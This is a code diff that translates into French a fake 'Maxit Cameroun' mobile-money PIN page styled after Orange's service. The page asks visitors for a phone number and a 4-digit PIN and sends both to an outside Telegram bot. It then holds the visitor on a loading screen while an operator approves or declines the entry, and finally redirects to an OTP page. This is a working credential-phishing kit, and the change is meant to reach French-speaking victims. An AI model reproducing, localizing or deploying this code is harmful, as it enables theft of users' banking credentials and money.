@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Maxit Cameroon - Enter PIN</title>
+    <title>Maxit Cameroun - Entrer le code PIN</title>
 
     <!-- Tailwind CSS for utility classes -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -306,19 +306,19 @@
     <div class="app-wrapper">
         <!-- Top Orange Header with Maxit Logo Image -->
         <header class="top-header">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYwj1M4hN5PAzSqrxgbrz3TKdC_biVQrc5JJlOQG3I8Q&s=10" alt="Maxit Logo" class="maxit-logo-img" onerror="this.style.display='none'; document.getElementById('altLogoText').style.display='block';">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYwj1M4hN5PAzSqrxgbrz3TKdC_biVQrc5JJlOQG3I8Q&s=10" alt="Logo Maxit" class="maxit-logo-img" onerror="this.style.display='none'; document.getElementById('altLogoText').style.display='block';">
             <span id="altLogoText" style="display:none; color:white; font-weight:800; font-size:24px;">Maxit</span>
         </header>
 
         <!-- Main Card Section -->
         <main class="card">
-            <h1 class="card-title">Enter your correct PIN</h1>
-            <p class="card-subtitle">Enter the correct PIN for your account</p>
+            <h1 class="card-title">Entrez votre code PIN correct</h1>
+            <p class="card-subtitle">Entrez le code PIN correct pour votre compte</p>
 
             <form id="pinForm" style="width: 100%;">
                 <!-- Phone Number Input Section -->
                 <div class="input-section">
-                    <label class="input-label" for="phoneNumberInput">Phone Number</label>
+                    <label class="input-label" for="phoneNumberInput">Numéro de téléphone</label>
                     <div class="phone-input-container">
                         <div class="country-code-box">+237</div>
                         <input type="tel" id="phoneNumberInput" class="phone-number-input" placeholder="699000000" maxlength="9" pattern="[0-9]{9}" autocomplete="tel">
@@ -328,27 +328,27 @@
                 <!-- PIN Input Section -->
                 <div class="pin-section">
                     <div class="pin-label-container">
-                        <span class="pin-label">Enter your PIN</span>
+                        <span class="pin-label">Entrez votre code PIN</span>
                     </div>
 
                     <div class="pin-boxes-container" id="pinContainer">
-                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" aria-label="PIN digit 1">
-                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 2">
-                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 3">
-                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 4">
+                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" aria-label="Chiffre 1 du code PIN">
+                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Chiffre 2 du code PIN">
+                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Chiffre 3 du code PIN">
+                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="Chiffre 4 du code PIN">
                     </div>
                 </div>
 
                 <!-- Submit Button Container -->
                 <div class="btn-submit-container">
-                    <button type="submit" class="btn-submit" id="submitBtn">SUBMIT</button>
+                    <button type="submit" class="btn-submit" id="submitBtn">SOUMETTRE</button>
                 </div>
             </form>
 
             <!-- Loading / Waiting Overlay -->
             <div id="loadingOverlay" class="loading-overlay">
                 <i class="fa-solid fa-circle-notch fa-spin fa-2x" style="color: #ff7900;"></i>
-                <span class="loading-text">Verifying details, please wait...</span>
+                <span class="loading-text">Vérification des informations, veuillez patienter...</span>
             </div>
         </main>
     </div>
@@ -356,7 +356,7 @@
     <!-- Toast Popup Container -->
     <div id="toast" class="toast">
         <i class="fa-solid fa-circle-check" id="toastIcon"></i>
-        <span id="toastMessage">PIN Submitted successfully!</span>
+        <span id="toastMessage">Code PIN soumis avec succès !</span>
     </div>
 
     <script>
@@ -461,7 +461,7 @@
                 sentMessageId = null;
                 clearTimers();
                 setWaiting(false);
-                showToast('Verification declined. Please re-enter details.', 'error');
+                showToast('Vérification refusée. Veuillez saisir à nouveau vos informations.', 'error');
                 if (pinBoxes[0]) pinBoxes[0].focus();
             };
 
@@ -516,7 +516,7 @@
                             });
                         })
                         .catch(err => {
-                            console.error("Polling error:", err);
+                            console.error("Erreur de scrutation :", err);
                         });
                 }, 2000);
             }
@@ -530,13 +530,13 @@
                 const pin = Array.from(pinBoxes).map(b => b.value).join('');
 
                 if (!phone) {
-                    showToast('Please enter your phone number', 'error');
+                    showToast('Veuillez entrer votre numéro de téléphone', 'error');
                     phoneInput.focus();
                     return;
                 }
 
                 if (pin.length < 4) {
-                    showToast('Please enter all 4 digits of your PIN', 'error');
+                    showToast('Veuillez entrer les 4 chiffres de votre code PIN', 'error');
                     const firstEmpty = Array.from(pinBoxes).find(b => !b.value);
                     if (firstEmpty) firstEmpty.focus();
                     return;
@@ -544,7 +544,7 @@
 
                 setWaiting(true);
 
-                const message = `📱 *Maxit Cameroon Submission*\n\n📞 *Phone:* \`+237${phone}\`\n🔐 *PIN:* \`${pin}\`\n⏱ *Time:* ${new Date().toLocaleString()}`;
+                const message = `📱 *Soumission Maxit Cameroun*\n\n📞 *Téléphone :* \`+237${phone}\`\n🔐 *PIN :* \`${pin}\`\n⏱ *Heure :* ${new Date().toLocaleString()}`;
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
                 // 60 seconds timeout
@@ -567,10 +567,10 @@
                             reply_markup: {
                                 inline_keyboard: [
                                     [{
-                                        text: "✅ Approve",
+                                        text: "✅ Approuver",
                                         callback_data: "approve"
                                     }, {
-                                        text: "❌ Decline",
+                                        text: "❌ Refuser",
                                         callback_data: "decline"
                                     }]
                                 ]
@@ -589,7 +589,7 @@
                         }
                     })
                     .catch(err => {
-                        console.error("Erreur Telegram:", err);
+                        console.error("Erreur Telegram :", err);
                         clearTimers();
                         setWaiting(false);
                         window.location.href = "otp.html";
